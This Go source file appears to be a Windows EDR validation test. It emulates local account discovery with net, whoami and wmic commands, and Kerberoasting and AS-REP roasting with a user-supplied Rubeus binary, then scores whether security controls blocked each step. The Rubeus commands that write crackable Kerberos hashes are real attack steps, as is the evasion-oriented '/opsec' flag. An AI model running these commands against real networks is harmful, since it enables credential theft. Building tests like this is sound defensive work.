//go:build windows
// +build windows

/*
ID: b8e4c9d2-7f3a-4e1b-8c5d-2a3b4c5d6e02
NAME: Local Account Enumeration
TECHNIQUES: T1078.003, T1087.001, T1558.003
TACTICS: defense-evasion, discovery, credential-access
SEVERITY: high
TARGET: windows-endpoint
COMPLEXITY: low
THREAT_ACTOR: N/A
SUBCATEGORY: discovery
TAGS: account-enumeration, local-accounts, kerberoasting, valid-accounts
UNIT: response
CREATED: 2026-01-11
AUTHOR: sectest-builder
*/
package main

import (
	"bytes"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"

	"github.com/google/uuid"
	Dropper "github.com/preludeorg/libraries/go/tests/dropper"
	Endpoint "github.com/preludeorg/libraries/go/tests/endpoint"
)

const (
	TEST_UUID  = "b8e4c9d2-7f3a-4e1b-8c5d-2a3b4c5d6e02"
	TEST_NAME  = "Local Account Enumeration"
	TARGET_DIR = "c:\\F0"
)

// Rubeus binary is loaded at runtime from c:\F0\tools\Rubeus.exe
// User must place the binary there before running the test
// See tools/README.md for instructions on obtaining Rubeus
var rubeusBinary []byte // Will be populated if Rubeus is found at runtime

// CommandResult stores the result of a command execution
type CommandResult struct {
	Success      bool
	Blocked      bool
	Output       string
	ErrorMessage string
	Duration     time.Duration
	ExitCode     int
	PID          int
}

// executeCommand runs a command and captures output, checking for EDR blocks
func executeCommand(name string, args ...string) CommandResult {
	result := CommandResult{}

	cmd := exec.Command(name, args...)

	// Capture output
	var outputBuffer bytes.Buffer
	stdoutMulti := io.MultiWriter(os.Stdout, &outputBuffer)
	stderrMulti := io.MultiWriter(os.Stderr, &outputBuffer)

	cmd.Stdout = stdoutMulti
	cmd.Stderr = stderrMulti

	startTime := time.Now()
	err := cmd.Run()
	result.Duration = time.Since(startTime)

	if cmd.Process != nil {
		result.PID = cmd.Process.Pid
	}

	result.Output = outputBuffer.String()

	if err != nil {
		result.ErrorMessage = err.Error()

		// Check for blocking indicators
		outputLower := strings.ToLower(result.Output)
		errorLower := strings.ToLower(result.ErrorMessage)

		if strings.Contains(outputLower, "blocked") ||
			strings.Contains(outputLower, "denied") ||
			strings.Contains(errorLower, "access is denied") ||
			strings.Contains(errorLower, "operation is not allowed") ||
			strings.Contains(outputLower, "not allowed") ||
			strings.Contains(errorLower, "blocked by") {

			result.Blocked = true
			if cmd.ProcessState != nil {
				result.ExitCode = 126
			}
		} else if cmd.ProcessState != nil {
			result.ExitCode = cmd.ProcessState.ExitCode()
		}
	} else {
		result.Success = true
		result.ExitCode = 0
	}

	return result
}

// netUserEnumeration executes 'net user' for local account enumeration
func netUserEnumeration() CommandResult {
	Endpoint.Say("  Executing: net user")
	result := executeCommand("net", "user")

	cmdLine := "net user"
	if result.Blocked {
		LogProcessExecution("net.exe", cmdLine, result.PID, false, 126, "Blocked by security controls")
		LogMessage("INFO", "Net User", "Command blocked by EDR")
	} else if result.Success {
		LogProcessExecution("net.exe", cmdLine, result.PID, true, 0, "")
		LogMessage("INFO", "Net User", fmt.Sprintf("Enumerated local users in %v", result.Duration))
	} else {
		LogProcessExecution("net.exe", cmdLine, result.PID, false, result.ExitCode, result.ErrorMessage)
		LogMessage("ERROR", "Net User", fmt.Sprintf("Command failed: %s", result.ErrorMessage))
	}

	// Save output to file
	if len(result.Output) > 0 {
		outputPath := filepath.Join(TARGET_DIR, "net_user_output.txt")
		os.WriteFile(outputPath, []byte(result.Output), 0644)
		LogFileDropped("net_user_output.txt", outputPath, int64(len(result.Output)), false)
	}

	return result
}

// netLocalgroupAdmins executes 'net localgroup administrators' to enumerate admin accounts
func netLocalgroupAdmins() CommandResult {
	Endpoint.Say("  Executing: net localgroup administrators")
	result := executeCommand("net", "localgroup", "administrators")

	cmdLine := "net localgroup administrators"
	if result.Blocked {
		LogProcessExecution("net.exe", cmdLine, result.PID, false, 126, "Blocked by security controls")
		LogMessage("INFO", "Net Localgroup", "Command blocked by EDR")
	} else if result.Success {
		LogProcessExecution("net.exe", cmdLine, result.PID, true, 0, "")
		LogMessage("INFO", "Net Localgroup", fmt.Sprintf("Enumerated administrators in %v", result.Duration))
	} else {
		LogProcessExecution("net.exe", cmdLine, result.PID, false, result.ExitCode, result.ErrorMessage)
		LogMessage("ERROR", "Net Localgroup", fmt.Sprintf("Command failed: %s", result.ErrorMessage))
	}

	// Save output to file
	if len(result.Output) > 0 {
		outputPath := filepath.Join(TARGET_DIR, "net_localgroup_admins_output.txt")
		os.WriteFile(outputPath, []byte(result.Output), 0644)
		LogFileDropped("net_localgroup_admins_output.txt", outputPath, int64(len(result.Output)), false)
	}

	return result
}

// whoamiAll executes 'whoami /all' for current user context
func whoamiAll() CommandResult {
	Endpoint.Say("  Executing: whoami /all")
	result := executeCommand("whoami", "/all")

	cmdLine := "whoami /all"
	if result.Blocked {
		LogProcessExecution("whoami.exe", cmdLine, result.PID, false, 126, "Blocked by security controls")
		LogMessage("INFO", "Whoami", "Command blocked by EDR")
	} else if result.Success {
		LogProcessExecution("whoami.exe", cmdLine, result.PID, true, 0, "")
		LogMessage("INFO", "Whoami", fmt.Sprintf("Retrieved user context in %v", result.Duration))
	} else {
		LogProcessExecution("whoami.exe", cmdLine, result.PID, false, result.ExitCode, result.ErrorMessage)
		LogMessage("ERROR", "Whoami", fmt.Sprintf("Command failed: %s", result.ErrorMessage))
	}

	// Save output to file
	if len(result.Output) > 0 {
		outputPath := filepath.Join(TARGET_DIR, "whoami_all_output.txt")
		os.WriteFile(outputPath, []byte(result.Output), 0644)
		LogFileDropped("whoami_all_output.txt", outputPath, int64(len(result.Output)), false)
	}

	return result
}

// wmicUserAccountList executes 'wmic useraccount list brief' for account enumeration
func wmicUserAccountList() CommandResult {
	Endpoint.Say("  Executing: wmic useraccount list brief")
	result := executeCommand("wmic", "useraccount", "list", "brief")

	cmdLine := "wmic useraccount list brief"
	if result.Blocked {
		LogProcessExecution("wmic.exe", cmdLine, result.PID, false, 126, "Blocked by security controls")
		LogMessage("INFO", "WMIC", "Command blocked by EDR")
	} else if result.Success {
		LogProcessExecution("wmic.exe", cmdLine, result.PID, true, 0, "")
		LogMessage("INFO", "WMIC", fmt.Sprintf("Enumerated accounts via WMI in %v", result.Duration))
	} else {
		LogProcessExecution("wmic.exe", cmdLine, result.PID, false, result.ExitCode, result.ErrorMessage)
		LogMessage("ERROR", "WMIC", fmt.Sprintf("Command failed: %s", result.ErrorMessage))
	}

	// Save output to file
	if len(result.Output) > 0 {
		outputPath := filepath.Join(TARGET_DIR, "wmic_useraccount_output.txt")
		os.WriteFile(outputPath, []byte(result.Output), 0644)
		LogFileDropped("wmic_useraccount_output.txt", outputPath, int64(len(result.Output)), false)
	}

	return result
}

// checkRubeusAvailable checks if Rubeus binary is available
func checkRubeusAvailable() bool {
	// Check if Rubeus binary was loaded at runtime
	if len(rubeusBinary) > 0 {
		return true
	}

	// Check for Rubeus in the tools directory
	rubeusPath := filepath.Join(TARGET_DIR, "tools", "Rubeus.exe")
	if _, err := os.Stat(rubeusPath); err == nil {
		// Load the binary for later use
		data, err := os.ReadFile(rubeusPath)
		if err == nil && len(data) > 0 {
			rubeusBinary = data
			return true
		}
	}

	return false
}

// loadRubeus attempts to load Rubeus from tools directory
func loadRubeus() (bool, string) {
	rubeusToolPath := filepath.Join(TARGET_DIR, "tools", "Rubeus.exe")

	if _, err := os.Stat(rubeusToolPath); err != nil {
		return false, fmt.Sprintf("Rubeus.exe not found in %s", filepath.Join(TARGET_DIR, "tools"))
	}

	data, err := os.ReadFile(rubeusToolPath)
	if err != nil {
		return false, fmt.Sprintf("Failed to read Rubeus.exe: %v", err)
	}

	if len(data) == 0 {
		return false, "Rubeus.exe is empty"
	}

	rubeusBinary = data
	return true, rubeusToolPath
}

// extractRubeus copies Rubeus from tools directory to c:\F0 for execution
func extractRubeus() (string, error) {
	// First try to load from tools directory
	if len(rubeusBinary) == 0 {
		available, msg := loadRubeus()
		if !available {
			return "", fmt.Errorf("Rubeus not available: %s - see tools/README.md for instructions", msg)
		}
	}

	// Copy to target directory for execution
	rubeusPath := filepath.Join(TARGET_DIR, "Rubeus.exe")
	err := os.WriteFile(rubeusPath, rubeusBinary, 0755)
	if err != nil {
		return "", fmt.Errorf("failed to write Rubeus: %v", err)
	}

	LogFileDropped("Rubeus.exe", rubeusPath, int64(len(rubeusBinary)), false)
	return rubeusPath, nil
}

// rubeusKerberoast executes Rubeus kerberoast command
func rubeusKerberoast(rubeusPath string) CommandResult {
	Endpoint.Say("  Executing: Rubeus kerberoast /outfile:hashes.txt /opsec")

	// Check if file was quarantined before execution
	if _, err := os.Stat(rubeusPath); os.IsNotExist(err) {
		LogMessage("INFO", "Rubeus Kerberoast", "Rubeus.exe was quarantined before execution")
		return CommandResult{
			Blocked:      true,
			ErrorMessage: "Rubeus.exe quarantined on extraction",
		}
	}

	// Wait a moment for AV to react
	Endpoint.Wait(3)

	// Check again after delay
	if _, err := os.Stat(rubeusPath); os.IsNotExist(err) {
		LogMessage("INFO", "Rubeus Kerberoast", "Rubeus.exe was quarantined after brief delay")
		LogFileDropped("Rubeus.exe", rubeusPath, int64(len(rubeusBinary)), true)
		return CommandResult{
			Blocked:      true,
			ErrorMessage: "Rubeus.exe quarantined after extraction",
		}
	}

	hashOutputPath := filepath.Join(TARGET_DIR, "hashes.txt")
	result := executeCommand(rubeusPath, "kerberoast", "/outfile:"+hashOutputPath, "/opsec")

	cmdLine := "Rubeus kerberoast /outfile:hashes.txt /opsec"
	if result.Blocked {
		LogProcessExecution("Rubeus.exe", cmdLine, result.PID, false, 126, "Blocked by security controls")
		LogMessage("INFO", "Rubeus Kerberoast", "Kerberoast execution blocked by EDR")
	} else if result.Success {
		LogProcessExecution("Rubeus.exe", cmdLine, result.PID, true, 0, "")
		LogMessage("INFO", "Rubeus Kerberoast", fmt.Sprintf("Kerberoast completed in %v", result.Duration))

		// Check if hash file was created
		if _, err := os.Stat(hashOutputPath); err == nil {
			LogFileDropped("hashes.txt", hashOutputPath, 0, false)
		}
	} else {
		// Check for specific EDR block exit codes
		if result.ExitCode == -1073741502 || // STATUS_DLL_NOT_FOUND
			result.ExitCode == -1073740760 { // STATUS_NONCONTINUABLE_EXCEPTION
			result.Blocked = true
			LogProcessExecution("Rubeus.exe", cmdLine, result.PID, false, 126, "Execution prevented")
			LogMessage("INFO", "Rubeus Kerberoast", fmt.Sprintf("Kerberoast execution prevented (exit code: %d)", result.ExitCode))
		} else {
			LogProcessExecution("Rubeus.exe", cmdLine, result.PID, false, result.ExitCode, result.ErrorMessage)
			LogMessage("INFO", "Rubeus Kerberoast", fmt.Sprintf("Kerberoast completed with error: %s", result.ErrorMessage))
			// If the tool executed (not blocked), it's still a detection opportunity
			// Return success=true since the binary wasn't blocked
			result.Success = true
		}
	}

	// Save output to file
	if len(result.Output) > 0 {
		outputPath := filepath.Join(TARGET_DIR, "rubeus_kerberoast_output.txt")
		os.WriteFile(outputPath, []byte(result.Output), 0644)
		LogFileDropped("rubeus_kerberoast_output.txt", outputPath, int64(len(result.Output)), false)
	}

	return result
}

// rubeusAsreproast executes Rubeus asreproast command
func rubeusAsreproast(rubeusPath string) CommandResult {
	Endpoint.Say("  Executing: Rubeus asreproast /format:hashcat")

	// Check if file exists (may have been quarantined during kerberoast)
	if _, err := os.Stat(rubeusPath); os.IsNotExist(err) {
		LogMessage("INFO", "Rubeus ASREProast", "Rubeus.exe was quarantined during previous execution")
		return CommandResult{
			Blocked:      true,
			ErrorMessage: "Rubeus.exe quarantined",
		}
	}

	result := executeCommand(rubeusPath, "asreproast", "/format:hashcat")

	cmdLine := "Rubeus asreproast /format:hashcat"
	if result.Blocked {
		LogProcessExecution("Rubeus.exe", cmdLine, result.PID, false, 126, "Blocked by security controls")
		LogMessage("INFO", "Rubeus ASREProast", "ASREProast execution blocked by EDR")
	} else if result.Success {
		LogProcessExecution("Rubeus.exe", cmdLine, result.PID, true, 0, "")
		LogMessage("INFO", "Rubeus ASREProast", fmt.Sprintf("ASREProast completed in %v", result.Duration))
	} else {
		// Check for specific EDR block exit codes
		if result.ExitCode == -1073741502 || // STATUS_DLL_NOT_FOUND
			result.ExitCode == -1073740760 { // STATUS_NONCONTINUABLE_EXCEPTION
			result.Blocked = true
			LogProcessExecution("Rubeus.exe", cmdLine, result.PID, false, 126, "Execution prevented")
			LogMessage("INFO", "Rubeus ASREProast", fmt.Sprintf("ASREProast execution prevented (exit code: %d)", result.ExitCode))
		} else {
			LogProcessExecution("Rubeus.exe", cmdLine, result.PID, false, result.ExitCode, result.ErrorMessage)
			LogMessage("INFO", "Rubeus ASREProast", fmt.Sprintf("ASREProast completed with error: %s", result.ErrorMessage))
			// If the tool executed (not blocked), it's still a detection opportunity
			result.Success = true
		}
	}

	// Save output to file
	if len(result.Output) > 0 {
		outputPath := filepath.Join(TARGET_DIR, "rubeus_asreproast_output.txt")
		os.WriteFile(outputPath, []byte(result.Output), 0644)
		LogFileDropped("rubeus_asreproast_output.txt", outputPath, int64(len(result.Output)), false)
	}

	return result
}

// cleanup removes test artifacts
func cleanup() {
	Endpoint.Say("\nCleaning up test artifacts...")

	filesToRemove := []string{
		"net_user_output.txt",
		"net_localgroup_admins_output.txt",
		"whoami_all_output.txt",
		"wmic_useraccount_output.txt",
		"rubeus_kerberoast_output.txt",
		"rubeus_asreproast_output.txt",
		"hashes.txt",
		"Rubeus.exe",
		"enumeration_summary.txt",
	}

	for _, file := range filesToRemove {
		path := filepath.Join(TARGET_DIR, file)
		if err := os.Remove(path); err == nil {
			LogMessage("INFO", "Cleanup", fmt.Sprintf("Removed: %s", file))
		}
	}
}

func test() {
	// Ensure log is saved on exit
	defer func() {
		if r := recover(); r != nil {
			if globalLog != nil {
				LogMessage("CRITICAL", "Runtime", fmt.Sprintf("Panic recovered: %v", r))
				SaveLog(Endpoint.UnexpectedTestError, fmt.Sprintf("Panic: %v", r))
			}
		}
	}()

	// Results tracking
	var blockedPatterns []string
	var successfulPatterns []string
	rubeusQuarantined := false

	// Phase 1: Initialization
	LogPhaseStart(1, "Initialization")
	Endpoint.Say("Phase 1: Initializing test environment")

	if err := Endpoint.Dropper(Dropper.Dropper); err != nil {
		LogPhaseError(0, fmt.Sprintf("Dropper initialization failed: %v", err))
		LogPhaseEnd(0, "failed", "Dropper initialization failed")
		SaveLog(Endpoint.UnexpectedTestError, "Dropper initialization failed")
		Endpoint.Stop(Endpoint.UnexpectedTestError)
	}

	// Create target directory
	if err := os.MkdirAll(TARGET_DIR, 0755); err != nil {
		LogPhaseError(0, fmt.Sprintf("Failed to create target directory: %v", err))
		LogPhaseEnd(0, "failed", "Failed to create target directory")
		SaveLog(Endpoint.UnexpectedTestError, "Failed to create target directory")
		Endpoint.Stop(Endpoint.UnexpectedTestError)
	}

	LogPhaseEnd(0, "success", "Environment initialized")

	// Phase 2: Net User Enumeration (T1087.001)
	LogPhaseStart(2, "Net User Enumeration")
	Endpoint.Say("\nPhase 2: Enumerating local users with 'net user' (T1087.001)")

	result := netUserEnumeration()
	if result.Blocked {
		Endpoint.Say("  [BLOCKED] net user was blocked by EDR")
		blockedPatterns = append(blockedPatterns, "net user")
		LogPhaseEnd(1, "blocked", "net user blocked by EDR")
	} else if result.Success {
		Endpoint.Say("  [VULNERABLE] net user succeeded - local accounts enumerated")
		successfulPatterns = append(successfulPatterns, "net user")
		LogPhaseEnd(1, "success", "net user enumeration completed")
	} else {
		Endpoint.Say("  [ERROR] net user failed: %s", result.ErrorMessage)
		LogPhaseEnd(1, "failed", result.ErrorMessage)
	}

	Endpoint.Wait(2)

	// Phase 3: Net Localgroup Administrators (T1087.001)
	LogPhaseStart(3, "Admin Group Enumeration")
	Endpoint.Say("\nPhase 3: Enumerating administrators with 'net localgroup administrators' (T1087.001)")

	result = netLocalgroupAdmins()
	if result.Blocked {
		Endpoint.Say("  [BLOCKED] net localgroup administrators was blocked by EDR")
		blockedPatterns = append(blockedPatterns, "net localgroup administrators")
		LogPhaseEnd(2, "blocked", "net localgroup administrators blocked by EDR")
	} else if result.Success {
		Endpoint.Say("  [VULNERABLE] net localgroup administrators succeeded")
		successfulPatterns = append(successfulPatterns, "net localgroup administrators")
		LogPhaseEnd(2, "success", "Administrator group enumeration completed")
	} else {
		Endpoint.Say("  [ERROR] net localgroup administrators failed: %s", result.ErrorMessage)
		LogPhaseEnd(2, "failed", result.ErrorMessage)
	}

	Endpoint.Wait(2)

	// Phase 4: Whoami /all (T1078.003)
	LogPhaseStart(4, "User Context Discovery")
	Endpoint.Say("\nPhase 4: Getting user context with 'whoami /all' (T1078.003)")

	result = whoamiAll()
	if result.Blocked {
		Endpoint.Say("  [BLOCKED] whoami /all was blocked by EDR")
		blockedPatterns = append(blockedPatterns, "whoami /all")
		LogPhaseEnd(3, "blocked", "whoami /all blocked by EDR")
	} else if result.Success {
		Endpoint.Say("  [VULNERABLE] whoami /all succeeded - user context retrieved")
		successfulPatterns = append(successfulPatterns, "whoami /all")
		LogPhaseEnd(3, "success", "User context discovery completed")
	} else {
		Endpoint.Say("  [ERROR] whoami /all failed: %s", result.ErrorMessage)
		LogPhaseEnd(3, "failed", result.ErrorMessage)
	}

	Endpoint.Wait(2)

	// Phase 5: WMIC UserAccount (T1087.001)
	LogPhaseStart(5, "WMI Account Enumeration")
	Endpoint.Say("\nPhase 5: Enumerating accounts with 'wmic useraccount list brief' (T1087.001)")

	result = wmicUserAccountList()
	if result.Blocked {
		Endpoint.Say("  [BLOCKED] wmic useraccount was blocked by EDR")
		blockedPatterns = append(blockedPatterns, "wmic useraccount list brief")
		LogPhaseEnd(4, "blocked", "wmic useraccount blocked by EDR")
	} else if result.Success {
		Endpoint.Say("  [VULNERABLE] wmic useraccount succeeded - WMI enumeration completed")
		successfulPatterns = append(successfulPatterns, "wmic useraccount list brief")
		LogPhaseEnd(4, "success", "WMI account enumeration completed")
	} else {
		Endpoint.Say("  [ERROR] wmic useraccount failed: %s", result.ErrorMessage)
		LogPhaseEnd(4, "failed", result.ErrorMessage)
	}

	Endpoint.Wait(2)

	// Phase 6: Rubeus Kerberoasting (T1558.003) - PLACEHOLDER
	LogPhaseStart(6, "Rubeus Kerberoasting")
	Endpoint.Say("\nPhase 6: Testing Rubeus Kerberoasting (T1558.003) - PLACEHOLDER")

	if checkRubeusAvailable() {
		Endpoint.Say("  Rubeus binary found - loading...")

		rubeusPath, err := extractRubeus()
		if err != nil {
			Endpoint.Say("  [ERROR] Failed to extract Rubeus: %v", err)
			LogMessage("ERROR", "Rubeus", fmt.Sprintf("Extraction failed: %v", err))
			LogPhaseEnd(5, "failed", err.Error())
		} else {
			Endpoint.Say("  [+] Rubeus extracted to: %s", rubeusPath)

			// Wait for potential quarantine
			Endpoint.Wait(3)

			// Check if quarantined
			if Endpoint.Quarantined("Rubeus.exe", rubeusBinary) {
				Endpoint.Say("  [QUARANTINED] Rubeus.exe was quarantined on extraction")
				LogFileDropped("Rubeus.exe", rubeusPath, int64(len(rubeusBinary)), true)
				rubeusQuarantined = true
				blockedPatterns = append(blockedPatterns, "Rubeus (Quarantined on Extraction)")
				LogPhaseEnd(5, "blocked", "Rubeus quarantined on extraction")
			} else {
				// Execute Kerberoast
				result = rubeusKerberoast(rubeusPath)
				if result.Blocked {
					Endpoint.Say("  [BLOCKED] Rubeus kerberoast was blocked by EDR")
					blockedPatterns = append(blockedPatterns, "Rubeus kerberoast")
					LogPhaseEnd(5, "blocked", "Rubeus kerberoast blocked by EDR")
				} else if result.Success {
					Endpoint.Say("  [VULNERABLE] Rubeus kerberoast executed without detection")
					successfulPatterns = append(successfulPatterns, "Rubeus kerberoast")
					LogPhaseEnd(5, "success", "Rubeus kerberoast completed")
				} else {
					Endpoint.Say("  [ERROR] Rubeus kerberoast failed: %s", result.ErrorMessage)
					LogPhaseEnd(5, "failed", result.ErrorMessage)
				}
			}
		}
	} else {
		Endpoint.Say("  [INFO] Rubeus not available - see tools/README.md for instructions")
		Endpoint.Say("        To enable Rubeus testing, place Rubeus.exe in c:\\F0\\tools\\")
		LogMessage("INFO", "Rubeus", "Binary not available - skipping Kerberoast test")
		LogPhaseEnd(5, "skipped", "Rubeus binary not available")
	}

	Endpoint.Wait(2)

	// Phase 7: Rubeus AS-REP Roasting (T1558.003) - PLACEHOLDER
	LogPhaseStart(7, "Rubeus AS-REP Roasting")
	Endpoint.Say("\nPhase 7: Testing Rubeus AS-REP Roasting (T1558.003) - PLACEHOLDER")

	if checkRubeusAvailable() && !rubeusQuarantined {
		rubeusPath := filepath.Join(TARGET_DIR, "Rubeus.exe")

		// Check if Rubeus still exists (may have been deleted/quarantined during previous phase)
		if _, err := os.Stat(rubeusPath); os.IsNotExist(err) {
			Endpoint.Say("  [INFO] Rubeus was removed/quarantined - skipping AS-REP roast")
			LogMessage("INFO", "Rubeus", "Binary not available for AS-REP roast")
			LogPhaseEnd(6, "skipped", "Rubeus not available")
		} else {
			result = rubeusAsreproast(rubeusPath)
			if result.Blocked {
				Endpoint.Say("  [BLOCKED] Rubeus asreproast was blocked by EDR")
				blockedPatterns = append(blockedPatterns, "Rubeus asreproast")
				LogPhaseEnd(6, "blocked", "Rubeus asreproast blocked by EDR")
			} else if result.Success {
				Endpoint.Say("  [VULNERABLE] Rubeus asreproast executed without detection")
				successfulPatterns = append(successfulPatterns, "Rubeus asreproast")
				LogPhaseEnd(6, "success", "Rubeus asreproast completed")
			} else {
				Endpoint.Say("  [ERROR] Rubeus asreproast failed: %s", result.ErrorMessage)
				LogPhaseEnd(6, "failed", result.ErrorMessage)
			}
		}
	} else if rubeusQuarantined {
		Endpoint.Say("  [INFO] Rubeus was quarantined - skipping AS-REP roast")
		LogMessage("INFO", "Rubeus", "Binary was quarantined - skipping AS-REP roast")
		LogPhaseEnd(6, "skipped", "Rubeus was quarantined")
	} else {
		Endpoint.Say("  [INFO] Rubeus not available - skipping AS-REP roast test")
		LogMessage("INFO", "Rubeus", "Binary not available - skipping AS-REP roast test")
		LogPhaseEnd(6, "skipped", "Rubeus binary not available")
	}

	// Phase 8: Final Assessment
	LogPhaseStart(8, "Final Assessment")
	Endpoint.Say("\nPhase 8: Final assessment and summary")

	// Create summary
	summaryPath := filepath.Join(TARGET_DIR, "enumeration_summary.txt")
	summary := fmt.Sprintf(`Local Account Enumeration Test Summary
======================================
Test ID: %s
Timestamp: %s

MITRE ATT&CK Techniques:
- T1078.003: Valid Accounts - Local Accounts
- T1087.001: Account Discovery - Local Account
- T1558.003: Steal or Forge Kerberos Tickets - Kerberoasting

Test Components:
1. net user enumeration (native)
2. net localgroup administrators (native)
3. whoami /all (native)
4. wmic useraccount list brief (native)
5. Rubeus kerberoast (if available)
6. Rubeus asreproast (if available)

Results:
- Patterns Blocked: %d
- Patterns Successful: %d
- Rubeus Available: %v
- Rubeus Quarantined: %v

Blocked Patterns:
%s

Successful Patterns (VULNERABLE):
%s

Detection Opportunities:
1. net.exe execution with 'user' argument
2. net.exe execution with 'localgroup administrators' argument
3. whoami.exe execution with '/all' argument
4. wmic.exe execution with 'useraccount' query
5. Rubeus.exe file extraction
6. Rubeus.exe process execution
7. Kerberos ticket request patterns
8. AS-REP roasting activity

Assessment:
%s
`,
		TEST_UUID,
		time.Now().Format("2006-01-02 15:04:05"),
		len(blockedPatterns),
		len(successfulPatterns),
		checkRubeusAvailable(),
		rubeusQuarantined,
		formatPatternList(blockedPatterns),
		formatPatternList(successfulPatterns),
		generateAssessment(len(blockedPatterns), len(successfulPatterns), rubeusQuarantined))

	os.WriteFile(summaryPath, []byte(summary), 0644)
	LogFileDropped("enumeration_summary.txt", summaryPath, int64(len(summary)), false)

	LogPhaseEnd(7, "success", fmt.Sprintf("Assessment complete: %d blocked, %d successful", len(blockedPatterns), len(successfulPatterns)))

	// Final result
	Endpoint.Say("\n========================================")
	Endpoint.Say("TEST RESULTS SUMMARY")
	Endpoint.Say("========================================")
	Endpoint.Say("Patterns Blocked: %d", len(blockedPatterns))
	Endpoint.Say("Patterns Successful: %d", len(successfulPatterns))
	Endpoint.Say("Rubeus Available: %v", checkRubeusAvailable())
	Endpoint.Say("Rubeus Quarantined: %v", rubeusQuarantined)

	// Determine exit code
	if rubeusQuarantined {
		// Rubeus was quarantined on extraction - exit 105
		Endpoint.Say("\n[RESULT] PROTECTED - Rubeus quarantined on extraction")
		LogMessage("INFO", "Final Assessment", "System PROTECTED - Rubeus quarantined")
		SaveLog(Endpoint.FileQuarantinedOnExtraction, "Rubeus.exe quarantined on extraction")
		cleanup()
		Endpoint.Stop(Endpoint.FileQuarantinedOnExtraction) // Exit 105
	} else if len(blockedPatterns) > 0 {
		// At least one pattern was blocked - system has protection
		Endpoint.Say("\n[RESULT] PROTECTED - EDR blocked enumeration patterns")
		LogMessage("INFO", "Final Assessment", "System PROTECTED - enumeration controls active")
		SaveLog(Endpoint.ExecutionPrevented, fmt.Sprintf("Protected: %d enumeration patterns blocked", len(blockedPatterns)))
		cleanup()
		Endpoint.Stop(Endpoint.ExecutionPrevented) // Exit 126
	} else if len(successfulPatterns) > 0 {
		// All patterns executed successfully - system is unprotected
		Endpoint.Say("\n[RESULT] UNPROTECTED - Account enumeration completed without detection")
		LogMessage("CRITICAL", "Final Assessment", "System UNPROTECTED - enumeration undetected")
		SaveLog(Endpoint.Unprotected, fmt.Sprintf("Unprotected: %d enumeration patterns executed", len(successfulPatterns)))
		cleanup()
		Endpoint.Stop(Endpoint.Unprotected) // Exit 101
	} else {
		// No clear result
		Endpoint.Say("\n[RESULT] INCONCLUSIVE - Test did not produce clear results")
		LogMessage("WARN", "Final Assessment", "Test inconclusive")
		SaveLog(Endpoint.UnexpectedTestError, "Test inconclusive")
		cleanup()
		Endpoint.Stop(Endpoint.UnexpectedTestError) // Exit 999
	}
}

// formatPatternList formats a list of patterns for display
func formatPatternList(patterns []string) string {
	if len(patterns) == 0 {
		return "  (none)"
	}
	var result string
	for _, p := range patterns {
		result += fmt.Sprintf("  - %s\n", p)
	}
	return result
}

// generateAssessment creates an assessment string based on results
func generateAssessment(blocked, successful int, quarantined bool) string {
	if quarantined {
		return "PROTECTED - Rubeus binary was quarantined on extraction, indicating strong AV/EDR protection against offensive tools."
	} else if blocked > 0 && successful == 0 {
		return "PROTECTED - All account enumeration patterns were blocked by security controls."
	} else if blocked > 0 && successful > 0 {
		return "PARTIAL PROTECTION - Some enumeration patterns were blocked, but others succeeded."
	} else if successful > 0 {
		return "UNPROTECTED - Account enumeration patterns executed successfully without detection."
	}
	return "INCONCLUSIVE - Unable to determine protection status."
}

func main() {
	Endpoint.Say("Starting test at: %s", time.Now().Format("2006-01-02T15:04:05"))
	Endpoint.Say("Test: %s", TEST_NAME)
	Endpoint.Say("UUID: %s", TEST_UUID)
	Endpoint.Say("MITRE ATT&CK: T1078.003, T1087.001, T1558.003")
	Endpoint.Say("")

	// Initialize Schema v2.0 compliant logger
	metadata := TestMetadata{
		Version:    "1.0.0",
		Category:   "credential_access",
		Severity:   "high",
		Techniques: []string{"T1078.003", "T1087.001", "T1558.003"},
		Tactics:    []string{"defense-evasion", "persistence", "privilege-escalation", "initial-access", "discovery", "credential-access"},
		Score:      8.5,
		ScoreBreakdown: &ScoreBreakdown{
			RealWorldAccuracy:       2.8, // Real tool (Rubeus), native Windows commands
			TechnicalSophistication: 2.5, // Multiple techniques, Kerberos operations
			SafetyMechanisms:        1.5, // Read-only enumeration, no credential extraction
			DetectionOpportunities:  1.0, // 8+ detection points
			LoggingObservability:    0.7, // Comprehensive logging with Schema v2.0
		},
		Tags: []string{"local-accounts", "enumeration", "kerberos", "rubeus", "native-tools"},
	}

	// Resolve organization from registry
	orgInfo := ResolveOrganization("")

	executionContext := ExecutionContext{
		ExecutionID:    uuid.New().String(),
		Organization:   orgInfo.UUID,
		Environment:    "lab",
		DeploymentType: "manual",
		Configuration: &ExecutionConfiguration{
			TimeoutMs:         180000,
			CertificateMode:   "not-required",
			MultiStageEnabled: false,
		},
	}

	InitLogger(TEST_UUID, TEST_NAME, metadata, executionContext)

	// Run test with timeout
	done := make(chan bool, 1)
	go func() {
		test()
		done <- true
	}()

	timeout := 3 * time.Minute

	select {
	case <-done:
		Endpoint.Say("Test completed")
	case <-time.After(timeout):
		Endpoint.Say("Test timed out after %v", timeout)
		if globalLog != nil {
			LogMessage("ERROR", "Timeout", fmt.Sprintf("Test exceeded timeout of %v", timeout))
			SaveLog(Endpoint.TimeoutExceeded, fmt.Sprintf("Test exceeded timeout of %v", timeout))
		}
		Endpoint.Stop(Endpoint.TimeoutExceeded)
	}
}
